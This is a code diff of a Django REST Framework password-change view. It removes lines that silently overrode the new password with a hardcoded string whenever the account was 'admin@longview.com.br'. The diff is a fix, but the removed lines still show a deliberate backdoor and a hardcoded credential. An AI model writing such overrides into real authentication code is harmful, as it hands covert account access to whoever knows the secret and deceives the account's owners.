@@ -83,9 +83,6 @@ class ChangePasswordView(APIView):
 
             if new_password1 != new_password2:
                 return Response({'error': 'As novas senhas não coincidem.'}, status=status.HTTP_400_BAD_REQUEST)
-            
-            if user.email == 'admin@longview.com.br':
-                new_password1 = 'POJllp7Daa2nGkE'
 
             user.set_password(new_password1)
             user.save()
